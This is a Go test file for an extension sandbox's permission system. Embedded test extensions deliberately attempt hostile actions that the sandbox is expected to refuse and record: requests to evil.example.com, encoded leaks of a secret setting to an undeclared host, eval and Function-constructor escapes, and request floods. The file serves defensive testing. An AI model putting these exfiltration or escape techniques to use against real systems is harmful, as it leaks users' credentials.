package extension

import (
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"
	"time"
	"tomtly/internal/store"
)

func TestAccessMistakesAreExplained(t *testing.T) {
	const head = `defineExtension({id:"a",name:"a",version:"1",data:{fetch(){}},`
	for want, source := range map[string]string{
		"moved to access.network":  head + `network:["api.example.com"]});`,
		"bogus":                    head + `access:{bogus:true}});`,
		"access.lan":               head + `access:{network:["lan"]}});`,
		"must also be in":          head + `access:{network:["a.example.com"]},settings:{k:{label:"K",type:"secret",sendTo:["b.example.com"]}}});`,
		"only applies to a secret": head + `access:{network:["a.example.com"]},settings:{k:{label:"K",type:"string",sendTo:["a.example.com"]}}});`,
	} {
		t.Run(want, func(t *testing.T) { failsWith(t, run(t, folder(t, source), nil), want) })
	}
}

func TestNothingRunsUntilApproved(t *testing.T) {
	approveAll.Store(false)
	t.Cleanup(func() { approveAll.Store(true) })
	const v1 = `defineExtension({id:"a",name:"a",version:"1",access:{network:["api.example.com"]},data:{fetch(){return 1}}});`
	dir, shared := folder(t, v1), store.NewMemory()
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	m := newManager(t.TempDir(), t.TempDir(), shared, hub(t))
	t.Cleanup(func() { stopAll(m) })
	m.add(ctx, entry{Source: dir})
	eventually(t, "it to wait", func() bool { return status(m).NeedsApproval })
	time.Sleep(50 * time.Millisecond)
	s := status(m)
	if s.Running || s.Access[0] != "Internet: api.example.com" {
		t.Fatalf("got %+v", s)
	}
	if d, _, _ := m.plugins.Get("a"); d != nil {
		t.Fatalf("ran without approval: %s", d)
	}
	if data, _ := json.Marshal(s); !strings.Contains(string(data), `"needsApproval":true`) || !strings.Contains(string(data), `"warnings":[]`) || !strings.Contains(string(data), `"violations":[]`) {
		t.Fatalf("got %s", data)
	}

	shared.RecordViolation(ctx, store.Violation{Extension: "a", Kind: "network", Detail: "old"})
	if _, err := approveSeen(m, dir); err != nil {
		t.Fatal(err)
	}
	eventually(t, "data", func() bool { d, _, _ := m.plugins.Get("a"); return string(d) == "1" })
	if s := status(m); s.NeedsApproval || !s.Running || len(s.Violations) != 0 {
		t.Fatalf("got %+v", s)
	}
	if _, err := approveSeen(m, dir); err == nil {
		t.Error("nothing was waiting")
	}

	// A new version asking for more is not covered by the old approval.
	write(t, dir, entryFile, strings.Replace(v1, `"api.example.com"]`, `"api.example.com"],storage:true`, 1))
	cancel()
	ctx2, cancel2 := context.WithCancel(context.Background())
	defer cancel2()
	again := newManager(t.TempDir(), t.TempDir(), shared, hub(t))
	t.Cleanup(func() { stopAll(again) })
	again.add(ctx2, entry{Source: dir})
	eventually(t, "it to wait again", func() bool { return status(again).NeedsApproval })
	if d, _, _ := again.plugins.Get("a"); d != nil {
		t.Fatal("the new version ran")
	}

	// The same version asking for nothing needs no approval.
	quiet := run(t, folder(t, `defineExtension({id:"b",name:"b",version:"1",data:{fetch(){return 1}}});`), nil)
	eventually(t, "it to run", func() bool { return status(quiet).Running })
	if _, err := approveSeen(quiet, status(quiet).Source); err == nil {
		t.Error("nothing was waiting")
	}
}

func TestUnreadableStoreGrantsNothing(t *testing.T) {
	approveAll.Store(false)
	t.Cleanup(func() { approveAll.Store(true) })
	m := run(t, folder(t, `defineExtension({id:"a",name:"a",version:"1",access:{storage:true},data:{fetch(){return 1}}});`), nil, func(m *Manager) {
		m.store = brokenGrants{m.store}
	})
	eventually(t, "it to wait", func() bool { return status(m).NeedsApproval })
}

func TestUndeclaredNetworkIsRefusedAndRecorded(t *testing.T) {
	var hits atomic.Int32
	server := httptest.NewServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) { hits.Add(1) }))
	defer server.Close()
	m := run(t, folder(t, `defineExtension({id:"a",name:"a",version:"1",data:{fetch(c){c.fetch("`+server.URL+`")}}});`), nil, allowLoopback)
	failsWith(t, m, "network list")
	expectViolation(t, m, "network")
	if hits.Load() != 0 {
		t.Fatal("the request got through")
	}
	if v := status(m).Violations; len(v) == 0 || v[0].Extension != "a" {
		t.Fatalf("got %+v", v)
	}
}

func TestTenViolationsQuarantineEvenIfCaught(t *testing.T) {
	m := run(t, folder(t, `defineExtension({id:"a",name:"a",version:"1",access:{network:["ok.example.com"]},devices:{everySeconds:1,poll(c){
		for (let n = 0; n < 15; n++) { try { c.fetch("https://evil.example.com/" + n); } catch (e) {} }
		c.log("still running");
		return [{id:"d",name:"d",values:[]}];
	}}});`), nil, func(m *Manager) {
		m.store.SetGrants(context.Background(), "a", []string{"network:ok.example.com"})
	})
	eventually(t, "quarantine", func() bool { return status(m).NeedsApproval && !status(m).Running })
	s := status(m)
	if !strings.Contains(s.Error, "Stopped after 10") {
		t.Fatalf("got %q", s.Error)
	}
	if grants, _ := m.store.Grants(context.Background(), "a"); len(grants) != 0 {
		t.Fatalf("grants should be revoked: %v", grants)
	}
	time.Sleep(1500 * time.Millisecond) // it must not keep polling, or restart by itself
	if n := len(violationsOf(t, m, "a")); n != 10 {
		t.Fatalf("%d violations: it kept running", n)
	}
	for _, d := range m.Devices() {
		if d.Online {
			t.Error("a stopped extension's devices must show offline")
		}
	}
	if s := status(m); !s.NeedsApproval || s.Running {
		t.Fatalf("got %+v", s)
	}
}

func TestStorageAndSocketsNeedDeclaring(t *testing.T) {
	for kind, call := range map[string]string{
		"storage": `c.storage.set("k", 1)`,
		"sockets": `c.udp.request("192.168.1.2", 1, "00")`,
	} {
		t.Run(kind, func(t *testing.T) {
			m := run(t, folder(t, `defineExtension({id:"a",name:"a",version:"1",data:{fetch(c){`+call+`}}});`), nil)
			failsWith(t, m, "needs "+kind+" in access")
			expectViolation(t, m, kind)
		})
	}
	t.Run("tcp", func(t *testing.T) {
		m := run(t, folder(t, `defineExtension({id:"a",name:"a",version:"1",data:{fetch(c){c.tcp.connect("192.168.1.2", 1)}}});`), nil)
		expectViolation(t, m, "sockets")
	})
	t.Run("discovery also needs lan", func(t *testing.T) {
		m := run(t, folder(t, `defineExtension({id:"a",name:"a",version:"1",access:{sockets:true},data:{fetch(c){c.udp.discover(1,"00")}}});`), nil)
		expectViolation(t, m, "lan")
	})
	t.Run("storage once declared", func(t *testing.T) {
		m := run(t, folder(t, `defineExtension({id:"a",name:"a",version:"1",access:{storage:true},data:{fetch(c){c.storage.set("k", 1); return c.storage.get("k")}}});`), nil)
		eventually(t, "data", func() bool { d, _, _ := m.plugins.Get("a"); return string(d) == "1" })
	})
}

func TestSecretOnlyGoesWhereSendToSays(t *testing.T) {
	const secret = "s3cr3t/key+ü"
	var goodHits, otherHits atomic.Int32
	count := func(n *atomic.Int32) *httptest.Server {
		s := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { n.Add(1) }))
		t.Cleanup(s.Close)
		return s
	}
	good, other := count(&goodHits), count(&otherHits)
	m := run(t, folder(t, `defineExtension({id:"a",name:"a",version:"1",access:{network:["{good}","{other}"]},
		settings:{good:{label:"G",type:"string",required:true},other:{label:"O",type:"string",required:true},key:{label:"K",type:"secret",required:true,sendTo:["{good}"]}},
		data:{everySeconds:3600,fetch(c){
			const s = c.settings, k = c.crypto, errors = [];
			const other = "http://" + s.other + "/";
			const attempts = [
				() => c.fetch(other + "?key=" + s.key),
				() => c.fetch(other + "?key=" + encodeURIComponent(s.key)),
				() => c.fetch(other, { headers: { Authorization: "Bearer " + s.key } }),
				() => c.fetch(other, { method: "POST", body: JSON.stringify({ key: s.key }) }),
				() => c.fetch(other + "?key=" + k.toBase64(k.hex(s.key))),
				() => c.fetch(other + "?key=" + k.toBase64(k.hex("x" + s.key))),
				() => c.fetch(other + "?key=" + k.toBase64(k.hex("xx" + s.key))),
				() => c.fetch(other + "?key=" + k.hex(s.key)),
				() => c.fetch(other + "?key=" + k.hex(s.key).toUpperCase()),
			];
			for (const attempt of attempts) {
				try { attempt(); errors.push("SENT"); } catch (e) { errors.push(String(e.message || e)); }
			}
			const ok = c.fetch("http://" + s.good + "/?key=" + s.key).status;
			c.fetch(other + "?harmless=1");
			return { errors, ok };
		}}});`), map[string]any{"good": strings.TrimPrefix(good.URL, "http://"), "other": strings.TrimPrefix(other.URL, "http://"), "key": secret}, allowLoopback)
	eventually(t, "the result", func() bool { d, _, _ := m.plugins.Get("a"); return d != nil })
	d, _, _ := m.plugins.Get("a")
	var got struct {
		Errors []string
		OK     int
	}
	if err := json.Unmarshal(d, &got); err != nil {
		t.Fatal(err)
	}
	for n, e := range got.Errors {
		if !strings.Contains(e, "sendTo") {
			t.Errorf("attempt %d was not refused for sendTo: %q", n, e)
		}
	}
	if got.OK != 200 || goodHits.Load() != 1 || otherHits.Load() != 1 {
		t.Errorf("ok=%d good=%d other=%d: the secret must reach its own host, and only that, while other requests still work", got.OK, goodHits.Load(), otherHits.Load())
	}
	violations := violationsOf(t, m, "a")
	if len(violations) != len(got.Errors) {
		t.Errorf("got %d violations", len(violations))
	}
	for _, v := range violations {
		if v.Kind != "secret" {
			t.Errorf("got %+v", v)
		}
	}
	// Neither the stored record nor the page may hold the secret in any form the check looks for.
	text := fmt.Sprint(violations, m.Statuses())
	for _, form := range secretForms(secret) {
		if strings.Contains(text, form) {
			t.Fatalf("leaked %q in %s", form, text)
		}
	}
}

func TestViolationDetailHidesASecretInAHostName(t *testing.T) {
	m := run(t, folder(t, `defineExtension({id:"a",name:"a",version:"1",settings:{key:{label:"K",type:"secret",required:true}},
		data:{fetch(c){c.fetch("https://" + c.settings.key + ".example.com/")}}});`), map[string]any{"key": "sk-abc123"})
	expectViolation(t, m, "network")
	if text := fmt.Sprint(violationsOf(t, m, "a"), m.Statuses()); strings.Contains(text, "sk-abc123") {
		t.Fatalf("leaked: %s", text)
	}
}

func TestDynamicCodeIsBlockedEvenWhenCaught(t *testing.T) {
	m := run(t, folder(t, `defineExtension({id:"a",name:"a",version:"1",data:{fetch(c){
		const results = [];
		const attempts = [
			() => (() => {}).constructor("return 1")(),
			() => (function* () {}).constructor("return 1"),
			() => (async () => {}).constructor("return 1"),
			() => eval("1"),
			() => (0, eval)("1"),
			() => new Function("return 1")(),
			() => Function("return 1")(),
			() => ({}).constructor.constructor("return 1")(),
		];
		for (const attempt of attempts) {
			try { results.push(attempt()); } catch (e) { results.push("blocked"); }
		}
		return { results, instance: (() => {}) instanceof Function, plain: [1, 2].map((x) => x * 2) };
	}}});`), nil)
	eventually(t, "the result", func() bool { d, _, _ := m.plugins.Get("a"); return d != nil })
	d, _, _ := m.plugins.Get("a")
	var got struct {
		Results  []any
		Instance bool
		Plain    []int
	}
	if err := json.Unmarshal(d, &got); err != nil {
		t.Fatal(err)
	}
	for n, r := range got.Results {
		if r != "blocked" {
			t.Errorf("attempt %d got %v", n, r)
		}
	}
	if !got.Instance || len(got.Plain) != 2 {
		t.Errorf("ordinary code must still work: %+v", got)
	}
	if n := len(violationsOf(t, m, "a")); n != 8 {
		t.Errorf("got %d violations, want 8", n)
	}
	expectViolation(t, m, "dynamic-code")
}

func TestDynamicCodeAtTheTopLevelIsRecorded(t *testing.T) {
	m := run(t, folder(t, `try { eval("1"); } catch (e) {}
		defineExtension({id:"a",name:"a",version:"1",data:{fetch(){return 1}}});`), nil)
	expectViolation(t, m, "dynamic-code")
}

func TestFloodIsLimited(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {}))
	defer server.Close()
	m := run(t, folder(t, `defineExtension({id:"a",name:"a",version:"1",access:{network:["{host}"]},settings:{host:{label:"H",type:"string",required:true}},
		data:{fetch(c){
			let done = 0;
			try { for (let n = 0; n < 700; n++) { c.fetch("http://" + c.settings.host + "/"); done++; } } catch (e) {}
			return { done };
		}}});`), map[string]any{"host": strings.TrimPrefix(server.URL, "http://")}, allowLoopback)
	eventually(t, "the result", func() bool { d, _, _ := m.plugins.Get("a"); return d != nil })
	if d, _, _ := m.plugins.Get("a"); string(d) != `{"done":600}` {
		t.Errorf("got %s", d)
	}
	expectViolation(t, m, "flood")
}

func TestScanWarnsAboutWhatIsntDeclared(t *testing.T) {
	l, err := load(folder(t, `defineExtension({id:"a",name:"a",version:"1",homepage:"https://home.example.org",access:{network:["api.example.com"]},data:{fetch(){
		if (Math.random() > 2) { eval("1"); new Function("1"); }
		return ["https://api.example.com/ok", "https://evil.example.net/collect", "tracker.example.org", "settings.json", "v1.2.0", "hello world.", "`+strings.Repeat("ab12", 150)+`", String.fromCharCode(1,2,3,4,5,6,7,8,9,10,11,12)];
	}}});`))
	if err != nil {
		t.Fatal(err)
	}
	all := strings.Join(l.warnings, "\n")
	for _, want := range []string{"eval(", "Function(", "evil.example.net", "tracker.example.org", "long encoded string", "character codes"} {
		if !strings.Contains(all, want) {
			t.Errorf("no warning about %q in:\n%s", want, all)
		}
	}
	for _, not := range []string{"api.example.com", "home.example.org", "settings.json", "v1.2.0"} {
		if strings.Contains(all, not) {
			t.Errorf("wrongly warned about %q in:\n%s", not, all)
		}
	}
}

func TestServiceOwnNetworkIsOffLimitsEvenFromASetting(t *testing.T) {
	_, subnet, err := net.ParseCIDR("172.24.0.0/16")
	if err != nil {
		t.Fatal(err)
	}
	n := newNetwork(accessDecl{Network: []string{"{host}"}, Lan: true}, map[string]any{"host": "postgres"}, false)
	n.own = &ownNetwork{subnets: []*net.IPNet{subnet}}
	for _, c := range []struct {
		address string
		allowed bool
	}{
		{"172.24.0.2:5432", false}, // the database container
		{"172.24.0.1:80", false},   // the machine running the container
		{"192.168.1.20:80", true},  // a real device
	} {
		ctx, cancel := context.WithTimeout(context.Background(), 150*time.Millisecond)
		conn, err := n.dialer(true).DialContext(ctx, "tcp", c.address)
		cancel()
		if conn != nil {
			conn.Close()
		}
		refused := err != nil && strings.Contains(err.Error(), "own network")
		if refused == c.allowed {
			t.Errorf("%s: allowed=%v, got %v", c.address, c.allowed, err)
		}
	}
	if !(&ownNetwork{names: []string{"localhost"}}).contains(net.ParseIP("127.0.0.1")) {
		t.Error("a named host should be checked by what it resolves to")
	}
}

func TestAClashSaysWhatIsInTheWay(t *testing.T) {
	m := pageManager(t)
	source := `defineExtension({id:"mine",name:"Mine",version:"1",data:{fetch(){return 1}}});`
	write(t, m.configDir, "extensions/copy/"+entryFile, source)
	write(t, m.configDir, "extensions/other/"+entryFile, source)

	if _, err := addSeen(m, context.Background(), "./extensions/copy", nil); err != nil {
		t.Fatal(err)
	}
	eventually(t, "it to run", func() bool { return status(m).Running })
	_, err := addSeen(m, context.Background(), "./extensions/other", nil)
	if err == nil || !strings.Contains(err.Error(), "Mine is already installed, from ./extensions/copy. Remove it first") {
		t.Errorf("got %v", err)
	}
}

func TestAnExtensionThatBreaksTheHostOnlyStopsItself(t *testing.T) {
	for name, source := range map[string]string{
		"JSON removed, then a poll":           `JSON = undefined; defineExtension({id:"a",name:"a",version:"1.0.0",devices:{everySeconds:1,poll(){return []}}});`,
		"JSON.parse replaced, then an action": `defineExtension({id:"a",name:"a",version:"1.0.0",actions:{go(){}}}); JSON.parse = function(){ throw new Error("no") };`,
	} {
		t.Run(name, func(t *testing.T) {
			m := run(t, folder(t, source), nil, allowLoopback)
			if strings.Contains(source, "actions") {
				eventually(t, "the action", func() bool { return m.plugins.Act("a", "go", nil) == nil })
			}
			eventually(t, "the crash on its card", func() bool { return status(m).Error != "" })
		})
	}
}
